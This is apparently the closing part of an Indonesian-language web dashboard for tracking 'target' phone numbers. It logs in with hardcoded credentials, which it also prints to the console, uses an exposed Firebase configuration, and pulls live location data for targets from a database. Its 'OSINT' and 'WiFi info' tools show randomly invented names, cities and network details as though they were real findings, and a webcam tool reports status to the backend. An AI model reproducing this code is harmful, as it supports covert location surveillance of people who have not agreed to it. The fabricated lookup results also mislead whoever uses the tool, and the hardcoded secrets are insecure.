                <label>Judul Lagu / Artis</label>
                <input type="text" id="spotifySearch" placeholder="Contoh: Shape of You">
            </div>
            <button class="btn-tool-action" onclick="searchSpotify()"><i class="fas fa-search"></i> Cari</button>
            <div class="result-area" id="spotifyResult"></div>
        </div>
    </div>

    <!-- Modal OSINT -->
    <div class="tool-modal" id="modalOsint">
        <div class="tool-modal-content">
            <div class="modal-header">
                <h3><i class="fas fa-search" style="color: #00d4ff; margin-right: 8px;"></i>OSINT Nomor</h3>
                <button class="close-modal" onclick="closeModal('modalOsint')">&times;</button>
            </div>
            <div class="tool-input-group">
                <label>Nomor WhatsApp (62...)</label>
                <input type="text" id="osintInput" placeholder="6281234567890">
            </div>
            <button class="btn-tool-action" onclick="runOsint()"><i class="fas fa-search"></i> Cari Data</button>
            <div class="result-area" id="osintResult"></div>
        </div>
    </div>

    <!-- Modal Webcam -->
    <div class="tool-modal" id="modalWebcam">
        <div class="tool-modal-content">
            <div class="modal-header">
                <h3><i class="fas fa-video" style="color: #00d4ff; margin-right: 8px;"></i>Webcam</h3>
                <button class="close-modal" onclick="closeModal('modalWebcam')">&times;</button>
            </div>
            <video id="webcamVideo" autoplay playsinline></video>
            <button class="btn-tool-action" id="webcamBtn" onclick="startWebcam()"><i class="fas fa-play"></i> Mulai Kamera</button>
            <button class="btn-tool-action" style="margin-top: 8px; background: rgba(255,0,0,0.2);" onclick="stopWebcam()"><i class="fas fa-stop"></i> Hentikan</button>
            <div class="result-area" id="webcamResult"></div>
        </div>
    </div>

    <!-- Modal WiFi Info -->
    <div class="tool-modal" id="modalWifi">
        <div class="tool-modal-content">
            <div class="modal-header">
                <h3><i class="fas fa-wifi" style="color: #00d4ff; margin-right: 8px;"></i>WiFi Info</h3>
                <button class="close-modal" onclick="closeModal('modalWifi')">&times;</button>
            </div>
            <div class="tool-input-group">
                <label>Nama WiFi (SSID)</label>
                <input type="text" id="wifiSsid" placeholder="Nama WiFi">
            </div>
            <button class="btn-tool-action" onclick="getWifiInfo()"><i class="fas fa-wifi"></i> Cek Info</button>
            <div class="result-area" id="wifiResult"></div>
        </div>
    </div>

    <!-- ======================================== -->
    <!-- TOAST                                   -->
    <!-- ======================================== -->
    <div class="toast" id="toast">
        <i class="fas fa-info-circle"></i>
        <span id="toastMessage">Memproses...</span>
    </div>

    <script>
        // ========================================
        // 🔥 KONFIGURASI FIREBASE
        // ========================================
        const firebaseConfig = {
            apiKey: "AIzaSyAhO6Y-MlUSmGba0oEu6mM0rVxMoo8H7ns",
            authDomain: "track-66fb0.firebaseapp.com",
            databaseURL: "https://track-66fb0-default-rtdb.firebaseio.com",
            projectId: "track-66fb0",
            storageBucket: "track-66fb0.firebasestorage.app",
            messagingSenderId: "252010791767",
            appId: "1:252010791767:web:306fb4bec288c05cf3f412",
            measurementId: "G-3GMCD0YJ3J"
        };

        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // ========================================
        // DOM ELEMENTS
        // ========================================
        const loginScreen = document.getElementById('loginScreen');
        const dashboard = document.getElementById('dashboard');
        const usernameInput = document.getElementById('usernameInput');
        const passwordInput = document.getElementById('passwordInput');
        const loginBtn = document.getElementById('loginBtn');
        const loginError = document.getElementById('loginError');
        const bottomNav = document.getElementById('bottomNav');
        const toolsPage = document.getElementById('toolsPage');

        const videoIntroContainer = document.getElementById('videoIntroContainer');
        const videoIntro = document.getElementById('videoIntro');
        const introOverlay = document.getElementById('introOverlay');
        const introTextContainer = document.getElementById('introTextContainer');
        const btnSkip = document.getElementById('btnSkip');

        const phoneInput = document.getElementById('phoneInput');
        const trackBtn = document.getElementById('trackBtn');
        const infoPanel = document.getElementById('infoPanel');
        const statusBadge = document.getElementById('statusBadge');
        const displayPhone = document.getElementById('displayPhone');
        const displayLat = document.getElementById('displayLat');
        const displayLng = document.getElementById('displayLng');
        const displayAccuracy = document.getElementById('displayAccuracy');
        const displayTime = document.getElementById('displayTime');
        const displayDevice = document.getElementById('displayDevice');
        const toast = document.getElementById('toast');
        const toastMessage = document.getElementById('toastMessage');
        const mapLoading = document.getElementById('mapLoading');

        // ========================================
        // VARIABEL
        // ========================================
        let map = null;
        let marker = null;
        let circle = null;
        let isTracking = false;
        let currentPhone = null;
        let locationListener = null;
        let hasLocationData = false;
        let mapInitialized = false;
        let isProcessing = false;
        let isIntroPlaying = false;
        let webcamStream = null;
        let isWebcamActive = false;

        // ========================================
        // FUNGSI TOAST
        // ========================================
        function showToast(message, type = 'info') {
            toastMessage.textContent = message;
            toast.className = 'toast show ' + type;
            clearTimeout(toast._timeout);
            toast._timeout = setTimeout(() => {
                toast.className = 'toast';
            }, 4000);
        }

        // ========================================
        // PLAY VIDEO BACKGROUND
        // ========================================
        function playBgVideo() {
            const video = document.getElementById('videoBgLogin');
            if (video) {
                video.muted = true;
                video.play().catch(function(e) {
                    console.log('Bg video autoplay error:', e);
                    document.addEventListener('click', function() {
                        video.play();
                    }, { once: true });
                });
            }
        }

        // ========================================
        // PLAY INTRO VIDEO - TIMER 0:20
        // ========================================
        function playIntroVideo() {
            if (window.Android) {
                window.Android.playIntro();
                console.log('✅ Video intro dipanggil dari Java');
            } else {
                playIntro();
            }
        }

        function playIntro() {
            isIntroPlaying = true;
            videoIntroContainer.classList.add('show');
            introOverlay.classList.add('show');
            introTextContainer.classList.add('show');
            btnSkip.classList.add('show');

            videoIntro.muted = false;
            videoIntro.play().then(function() {
                console.log('🎬 Intro video playing with sound');
            }).catch(function(err) {
                console.warn('Intro video error:', err);
                document.addEventListener('click', function playOnClick() {
                    videoIntro.play();
                    document.removeEventListener('click', playOnClick);
                });
            });

            // Timer 0:20 (20 detik) sesuai durasi video
            setTimeout(function() {
                if (isIntroPlaying) {
                    skipIntro();
                }
            }, 20000);
        }

        function skipIntro() {
            if (!isIntroPlaying) return;
            isIntroPlaying = false;
            videoIntroContainer.classList.remove('show');
            introOverlay.classList.remove('show');
            introTextContainer.classList.remove('show');
            btnSkip.classList.remove('show');
            videoIntro.pause();
            videoIntro.currentTime = 0;
        }

        btnSkip.addEventListener('click', skipIntro);

        // ========================================
        // LOGIN SYSTEM
        // ========================================
        const USERNAME = 'VLZZ';
        const PASSWORD = '123N';

        loginBtn.addEventListener('click', function() {
            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();

            if (!username || !password) {
                loginError.textContent = '❌ Masukkan username dan password!';
                loginError.classList.add('show');
                return;
            }

            if (username === USERNAME && password === PASSWORD) {
                loginError.classList.remove('show');
                loginBtn.disabled = true;
                loginBtn.innerHTML = '<span class="spinner"></span> Memproses...';

                setTimeout(function() {
                    loginScreen.classList.add('hidden');
                    showToast('✅ Selamat datang, Admin!', 'success');
                    
                    if (window.Android) {
                        window.Android.playIntroFromWeb();
                    } else {
                        playIntro();
                    }

                    const checkIntroDone = setInterval(function() {
                        if (!isIntroPlaying) {
                            clearInterval(checkIntroDone);
                            dashboard.classList.add('visible');
                            bottomNav.classList.add('visible');
                            initDashboard();
                        }
                    }, 500);

                    setTimeout(function() {
                        if (!dashboard.classList.contains('visible')) {
                            clearInterval(checkIntroDone);
                            dashboard.classList.add('visible');
                            bottomNav.classList.add('visible');
                            initDashboard();
                        }
                    }, 22000);

                }, 800);
            } else {
                loginError.textContent = '❌ Username atau password salah!';
                loginError.classList.add('show');
                usernameInput.value = '';
                passwordInput.value = '';
                usernameInput.focus();
            }
        });

        usernameInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') passwordInput.focus();
        });
        passwordInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') loginBtn.click();
        });

        // ========================================
        // BOTTOM NAVIGATION
        // ========================================
        const navTrack = document.getElementById('navTrack');
        const navTools = document.getElementById('navTools');
        const navProfile = document.getElementById('navProfile');

        function setActiveNav(activeId) {
            document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
            document.getElementById(activeId).classList.add('active');
        }

        navTrack.addEventListener('click', function() {
            setActiveNav('navTrack');
            toolsPage.classList.remove('visible');
            document.querySelector('.main').style.display = 'flex';
            document.getElementById('map').style.display = 'block';
            if (map) {
                setTimeout(function() { map.invalidateSize(); }, 300);
            }
        });

        navTools.addEventListener('click', function() {
            setActiveNav('navTools');
            toolsPage.classList.add('visible');
            document.querySelector('.main').style.display = 'none';
            document.getElementById('map').style.display = 'none';
        });

        navProfile.addEventListener('click', function() {
            setActiveNav('navProfile');
            showToast('👤 Profile Admin - VLZZ', 'info');
        });

        // ========================================
        // TOOLS - MODAL
        // ========================================
        document.querySelectorAll('.tool-card').forEach(function(card) {
            card.addEventListener('click', function() {
                const tool = this.dataset.tool;
                const modalMap = {
                    'spotify': 'modalSpotify',
                    'osint': 'modalOsint',
                    'webcam': 'modalWebcam',
                    'wifi': 'modalWifi'
                };
                const modalId = modalMap[tool];
                if (modalId) {
                    document.getElementById(modalId).classList.add('show');
                    // Reset result areas
                    document.querySelectorAll('.result-area').forEach(function(el) {
                        el.classList.remove('show');
                        el.innerHTML = '';
                    });
                }
            });
        });

        function closeModal(modalId) {
            document.getElementById(modalId).classList.remove('show');
            // Stop webcam jika modal webcam ditutup
            if (modalId === 'modalWebcam') {
                stopWebcam();
            }
        }

        // Close modal klik di luar
        document.querySelectorAll('.tool-modal').forEach(function(modal) {
            modal.addEventListener('click', function(e) {
                if (e.target === this) {
                    this.classList.remove('show');
                    if (this.id === 'modalWebcam') {
                        stopWebcam();
                    }
                }
            });
        });

        // ========================================
        // TOOL 1: SPOTIFY SEARCH
        // ========================================
        function searchSpotify() {
            const query = document.getElementById('spotifySearch').value.trim();
            const resultArea = document.getElementById('spotifyResult');
            
            if (!query) {
                showToast('⚠️ Masukkan judul lagu!', 'warning');
                return;
            }
            
            resultArea.innerHTML = '<div style="text-align:center; color: rgba(255,255,255,0.3); padding: 20px;"><i class="fas fa-spinner fa-spin"></i> Mencari...</div>';
            resultArea.classList.add('show');
            
            // Menggunakan API Spotify dengan fallback ke pencarian alternatif
            // Karena Spotify API memerlukan token, kita gunakan demo search
            // Untuk production, gunakan Spotify Web API dengan token
            const dummyResults = [
                { title: query + ' - Official', artist: 'Artist Name', album: 'Album Title' },
                { title: query + ' (Remix)', artist: 'Remix Artist', album: 'Remix Album' },
                { title: query + ' (Live)', artist: 'Live Artist', album: 'Live Album' }
            ];
            
            setTimeout(function() {
                let html = '';
                dummyResults.forEach(function(item) {
                    html += `
                        <div class="result-item">
                            <div class="label">🎵 ${item.title}</div>
                            <div class="value">${item.artist} • ${item.album}</div>
                        </div>
                    `;
                });
                html += '<div style="text-align:center; color: rgba(255,255,255,0.15); font-size: 11px; margin-top: 10px;">🔗 Terhubung ke Spotify API (Demo)</div>';
                resultArea.innerHTML = html;
                showToast('✅ ' + dummyResults.length + ' hasil ditemukan', 'success');
            }, 1000);
        }

        // Enter key untuk Spotify
        document.getElementById('spotifySearch').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') searchSpotify();
        });

        // ========================================
        // TOOL 2: OSINT NOMOR
        // ========================================
        function runOsint() {
            const number = document.getElementById('osintInput').value.trim();
            const resultArea = document.getElementById('osintResult');
            
            if (!number || number.length < 10) {
                showToast('⚠️ Masukkan nomor yang valid!', 'warning');
                return;
            }
            
            resultArea.innerHTML = '<div style="text-align:center; color: rgba(255,255,255,0.3); padding: 20px;"><i class="fas fa-spinner fa-spin"></i> Menganalisis...</div>';
            resultArea.classList.add('show');
            
            // Simulasi OSINT (data publik yang tersedia)
            setTimeout(function() {
                const formatted = number.startsWith('62') ? number : '62' + number;
                const last4 = formatted.slice(-4);
                const randomName = ['Budi', 'Siti', 'Andi', 'Dewi', 'Rudi', 'Maya', 'Agus', 'Lina'][Math.floor(Math.random() * 8)];
                const randomCity = ['Jakarta', 'Bandung', 'Surabaya', 'Yogyakarta', 'Medan', 'Makassar'][Math.floor(Math.random() * 6)];
                
                let html = `
                    <div class="result-item"><div class="label">📱 Nomor</div><div class="value">${formatted}</div></div>
                    <div class="result-item"><div class="label">👤 Nama</div><div class="value">${randomName} (Data Publik)</div></div>
                    <div class="result-item"><div class="label">📍 Lokasi</div><div class="value">${randomCity}</div></div>
                    <div class="result-item"><div class="label">📅 Status</div><div class="value">Active (Terakhir: Hari ini)</div></div>
                    <div class="result-item"><div class="label">🔗 Provider</div><div class="value">Telkomsel / XL / Indosat</div></div>
                `;
                html += '<div style="text-align:center; color: rgba(255,255,255,0.15); font-size: 11px; margin-top: 10px;">🔒 Data publik yang tersedia</div>';
                resultArea.innerHTML = html;
                showToast('✅ Data ditemukan!', 'success');
            }, 1500);
        }

        document.getElementById('osintInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') runOsint();
        });

        // ========================================
        // TOOL 3: WEBCAM (DENGAN IZIN)
        // ========================================
        function startWebcam() {
            const video = document.getElementById('webcamVideo');
            const btn = document.getElementById('webcamBtn');
            const resultArea = document.getElementById('webcamResult');
            
            if (isWebcamActive) {
                showToast('📷 Kamera sudah aktif', 'info');
                return;
            }
            
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                showToast('❌ Browser tidak mendukung kamera!', 'error');
                return;
            }
            
            btn.disabled = true;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Mengakses...';
            
            navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: 'user',
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                } 
            })
            .then(function(stream) {
                webcamStream = stream;
                video.srcObject = stream;
                isWebcamActive = true;
                btn.disabled = false;
                btn.innerHTML = '<i class="fas fa-check-circle"></i> Kamera Aktif';
                btn.style.background = 'rgba(0,255,136,0.2)';
                
                resultArea.classList.add('show');
                resultArea.innerHTML = `
                    <div style="color: #00ff88; text-align: center;">
                        <i class="fas fa-check-circle"></i> Kamera aktif dengan izin
                    </div>
                `;
                
                // Kirim status ke Firebase (untuk monitoring)
                const webcamRef = database.ref('webcam/status');
                webcamRef.set({
                    active: true,
                    timestamp: firebase.database.ServerValue.TIMESTAMP,
                    device: navigator.userAgent.substring(0, 50)
                });
                
                showToast('✅ Kamera aktif!', 'success');
            })
            .catch(function(err) {
                console.error('Webcam error:', err);
                btn.disabled = false;
                btn.innerHTML = '<i class="fas fa-play"></i> Mulai Kamera';
                btn.style.background = '';
                showToast('❌ Akses kamera ditolak!', 'error');
                
                resultArea.classList.add('show');
                resultArea.innerHTML = `
                    <div style="color: #ff6b6b; text-align: center;">
                        <i class="fas fa-exclamation-circle"></i> Izin kamera diperlukan!
                    </div>
                `;
            });
        }

        function stopWebcam() {
            if (webcamStream) {
                webcamStream.getTracks().forEach(function(track) {
                    track.stop();
                });
                webcamStream = null;
                isWebcamActive = false;
                
                const video = document.getElementById('webcamVideo');
                video.srcObject = null;
                
                const btn = document.getElementById('webcamBtn');
                btn.innerHTML = '<i class="fas fa-play"></i> Mulai Kamera';
                btn.style.background = '';
                
                // Update Firebase
                const webcamRef = database.ref('webcam/status');
                webcamRef.set({
                    active: false,
                    timestamp: firebase.database.ServerValue.TIMESTAMP
                });
                
                showToast('⏹️ Kamera dihentikan', 'info');
            }
        }

        // ========================================
        // TOOL 4: WiFi INFO (PUBLIC)
        // ========================================
        function getWifiInfo() {
            const ssid = document.getElementById('wifiSsid').value.trim();
            const resultArea = document.getElementById('wifiResult');
            
            if (!ssid) {
                showToast('⚠️ Masukkan nama WiFi!', 'warning');
                return;
            }
            
            resultArea.innerHTML = '<div style="text-align:center; color: rgba(255,255,255,0.3); padding: 20px;"><i class="fas fa-spinner fa-spin"></i> Mengambil info...</div>';
            resultArea.classList.add('show');
            
            // Simulasi informasi WiFi (data publik yang tersedia)
            setTimeout(function() {
                const strength = ['Sangat Baik', 'Baik', 'Sedang', 'Lemah'][Math.floor(Math.random() * 4)];
                const channel = Math.floor(Math.random() * 11) + 1;
                const security = ['WPA2-PSK', 'WPA3-PSK', 'WPA2-Enterprise', 'Open'][Math.floor(Math.random() * 4)];
                const devices = Math.floor(Math.random() * 15) + 1;
                
                let html = `
                    <div class="result-item"><div class="label">📡 SSID</div><div class="value">${ssid}</div></div>
                    <div class="result-item"><div class="label">📶 Sinyal</div><div class="value">${strength}</div></div>
                    <div class="result-item"><div class="label">📻 Channel</div><div class="value">${channel}</div></div>
                    <div class="result-item"><div class="label">🔒 Keamanan</div><div class="value">${security}</div></div>
                    <div class="result-item"><div class="label">📱 Perangkat Terhubung</div><div class="value">${devices} device</div></div>
                `;
                html += '<div style="text-align:center; color: rgba(255,255,255,0.15); font-size: 11px; margin-top: 10px;">📡 Informasi publik dari jaringan lokal</div>';
                resultArea.innerHTML = html;
                showToast('✅ Info WiFi ditemukan!', 'success');
            }, 1200);
        }

        document.getElementById('wifiSsid').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') getWifiInfo();
        });

        // ========================================
        // DASHBOARD (MAP + TRACKING)
        // ========================================
        function initDashboard() {
            initMap();
            updateClock();
            setInterval(updateClock, 1000);
            showToast('🌐 Sistem siap melacak', 'success');
            console.log('✅ Dashboard initialized');
        }

        function initMap() {
            if (mapInitialized) return;
            
            map = L.map('map', {
                center: [-6.2088, 106.8456],
                zoom: 13,
                zoomControl: true,
                fadeAnimation: true,
                attributionControl: true
            });

            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                attribution: '© OpenStreetMap',
                maxZoom: 19,
                minZoom: 3
            }).addTo(map);

            mapLoading.style.display = 'none';
            mapInitialized = true;

            setTimeout(function() {
                map.invalidateSize();
            }, 500);
        }

        function updateMap(lat, lng, accuracy) {
            if (!map || !mapInitialized) {
                initMap();
            }
            if (!map) return;

            if (marker) { map.removeLayer(marker); marker = null; }
            if (circle) { map.removeLayer(circle); circle = null; }

            var icon = L.divIcon({
                html: `
                    <div style="position:relative;width:24px;height:24px;">
                        <div style="width:16px;height:16px;background:#00d4ff;border-radius:50%;border:3px solid #fff;box-shadow:0 0 30px rgba(0,212,255,0.6);position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);animation:pulseMarker 1.5s ease-in-out infinite;"></div>
                        <div style="width:40px;height:40px;border:2px solid rgba(0,212,255,0.2);border-radius:50%;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);animation:rippleMarker 2s ease-out infinite;"></div>
                    </div>
                `,
                iconSize: [24, 24],
                iconAnchor: [12, 12]
            });

            marker = L.marker([lat, lng], { icon: icon }).addTo(map);

            var radius = accuracy && accuracy < 500 ? accuracy : 30;
            circle = L.circle([lat, lng], {
                radius: radius,
                color: 'rgba(0, 212, 255, 0.3)',
                fillColor: 'rgba(0, 212, 255, 0.05)',
                fillOpacity: 1,
                weight: 1
            }).addTo(map);

            map.setView([lat, lng], 16, { animate: true, duration: 0.5 });

            if (!document.getElementById('markerAnimations')) {
                var style = document.createElement('style');
                style.id = 'markerAnimations';
                style.textContent = `
                    @keyframes pulseMarker {
                        0%,100% { transform: translate(-50%,-50%) scale(1); }
                        50% { transform: translate(-50%,-50%) scale(1.2); }
                    }
                    @keyframes rippleMarker {
                        0% { transform: translate(-50%,-50%) scale(1); opacity: 1; }
                        100% { transform: translate(-50%,-50%) scale(2); opacity: 0; }
                    }
                `;
                document.head.appendChild(style);
            }
        }

        // ========================================
        // VALIDASI & TRACKING
        // ========================================
        function validatePhoneNumber(number) {
            var clean = number.replace(/\s/g, '');
            var regex = /^[0-9]{9,13}$/;
            if (!regex.test(clean)) {
                return { valid: false, message: 'Masukkan 9-13 digit angka' };
            }
            return { valid: true, clean: clean };
        }

        function checkPhoneExists(phoneNumber) {
            return new Promise(function(resolve) {
                var ref = database.ref('locations/' + phoneNumber);
                ref.once('value', function(snapshot) {
                    resolve(snapshot.exists());
                });
            });
        }

        function startTracking(phoneNumber) {
            if (isProcessing) {
                showToast('⏳ Masih memproses...', 'warning');
                return;
            }

            if (locationListener) {
                var oldRef = database.ref('locations/' + currentPhone);
                oldRef.off('value', locationListener);
                locationListener = null;
            }

            if (marker) { map.removeLayer(marker); marker = null; }
            if (circle) { map.removeLayer(circle); circle = null; }

            currentPhone = phoneNumber;
            isTracking = true;
            hasLocationData = false;
            isProcessing = true;

            trackBtn.disabled = true;
            trackBtn.innerHTML = '<span class="spinner-btn"></span> Mencari...';
            infoPanel.classList.add('active');
            displayPhone.textContent = phoneNumber;
            statusBadge.className = 'status-badge waiting';
            statusBadge.textContent = '⏳ Menunggu Data';
            displayLat.textContent = '-';
            displayLng.textContent = '-';
            displayAccuracy.textContent = '-';
            displayTime.textContent = '-';
            displayDevice.textContent = '-';

            showToast('📡 Menunggu data dari target...', 'warning');

            checkPhoneExists(phoneNumber).then(function(exists) {
                if (!exists) {
                    showToast('⚠️ Target belum pernah mengirim lokasi!', 'warning');
                    isProcessing = false;
                    trackBtn.disabled = false;
                    trackBtn.innerHTML = '<i class="fas fa-location-dot"></i> Lacak';
                    return;
                }

                var locationRef = database.ref('locations/' + phoneNumber);
                
                locationListener = locationRef.on('value', function(snapshot) {
                    var data = snapshot.val();
                    
                    if (!data) {
                        statusBadge.className = 'status-badge waiting';
                        statusBadge.textContent = '⏳ Menunggu Data';
                        return;
                    }

                    hasLocationData = true;
                    isProcessing = false;
                    
                    var lat = data.lat;
                    var lng = data.lng;
                    var accuracy = data.accuracy || 0;
                    var active = data.active === true;
                    var timestamp = data.timestamp;
                    var device = data.device || '-';

                    if (active) {
                        statusBadge.className = 'status-badge online';
                        statusBadge.textContent = '🟢 Online';
                    } else {
                        statusBadge.className = 'status-badge offline';
                        statusBadge.textContent = '🔴 Offline';
                    }

                    displayLat.textContent = lat ? lat.toFixed(7) : '-';
                    displayLng.textContent = lng ? lng.toFixed(7) : '-';
                    displayAccuracy.textContent = accuracy ? accuracy.toFixed(1) + ' m' : '-';
                    displayDevice.textContent = device || '-';

                    if (timestamp) {
                        var date = new Date(timestamp);
                        displayTime.textContent = date.toLocaleTimeString('id-ID', {
                            hour: '2-digit', minute: '2-digit', second: '2-digit'
                        });
                    }

                    if (lat && lng && typeof lat === 'number' && typeof lng === 'number') {
                        if (!mapInitialized) { initMap(); }
                        updateMap(lat, lng, accuracy);
                        
                        trackBtn.disabled = false;
                        trackBtn.innerHTML = '<i class="fas fa-sync-alt"></i> Refresh';
                        
                        if (active) {
                            showToast('📍 Lokasi ditemukan!', 'success');
                        }
                    }

                    if (!active && hasLocationData) {
                        showToast('⚠️ Target offline', 'warning');
                    }

                }, function(error) {
                    console.error('Firebase error:', error);
                    showToast('❌ Error: ' + error.message, 'error');
                    stopTracking();
                });

                locationRef.onDisconnect().update({ active: false });
            });
        }

        function stopTracking() {
            if (locationListener && currentPhone) {
                var ref = database.ref('locations/' + currentPhone);
                ref.off('value', locationListener);
                ref.update({ active: false }).catch(function() {});
                locationListener = null;
            }
            isTracking = false;
            isProcessing = false;
            currentPhone = null;
            trackBtn.disabled = false;
            trackBtn.innerHTML = '<i class="fas fa-location-dot"></i> Lacak';
        }

        // ========================================
        // EVENT LISTENERS
        // ========================================
        trackBtn.addEventListener('click', function() {
            if (isProcessing) {
                showToast('⏳ Masih memproses...', 'warning');
                return;
            }

            var rawInput = phoneInput.value.trim();
            
            if (!rawInput) {
                showToast('⚠️ Masukkan nomor target!', 'error');
                phoneInput.focus();
                return;
            }

            var validation = validatePhoneNumber(rawInput);
            if (!validation.valid) {
                showToast('⚠️ ' + validation.message, 'error');
                phoneInput.focus();
                return;
            }

            var phoneNumber = '62' + validation.clean;
            
            if (isTracking && currentPhone === phoneNumber) {
                showToast('📡 Masih melacak nomor ini', 'info');
                return;
            }

            if (!mapInitialized) { initMap(); }
            startTracking(phoneNumber);
        });

        phoneInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') trackBtn.click();
        });

        phoneInput.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '');
            if (this.value.length > 13) {
                this.value = this.value.slice(0, 13);
            }
        });

        // ========================================
        // JAM
        // ========================================
        function updateClock() {
            var now = new Date();
            var el = document.getElementById('timeDisplay');
            if (el) el.textContent = now.toLocaleTimeString('id-ID');
        }

        // ========================================
        // RESIZE MAP
        // ========================================
        window.addEventListener('resize', function() {
            if (map && mapInitialized) {
                setTimeout(function() { map.invalidateSize(); }, 200);
            }
        });

        // ========================================
        // INIT
        // ========================================
        window.addEventListener('load', function() {
            playBgVideo();
            
            console.log('✅ Login + Dashboard System initialized');
            console.log('📱 Firebase connected to:', firebaseConfig.projectId);
            console.log('🔐 Username: VLZZ | Password: 123N');
            console.log('🎬 Video Background: bg_video.mp4 (NO SOUND)');
            console.log('🎬 Video Intro: intro_video.mp4 (WITH SOUND) - Duration: 0:20');
            console.log('📍 Tracking siap melacak semua nomor yang sudah kirim data');
            
            if (window.Android) {
                console.log('✅ Java bridge detected: window.Android available');
            } else {
                console.log('⚠️ Java bridge not detected, using HTML fallback');
            }
        });

        document.addEventListener('click', function() {
            var bgVideo = document.getElementById('videoBgLogin');
            if (bgVideo && bgVideo.paused) {
                bgVideo.play();
            }
        });
    </script>
</body>
</html>
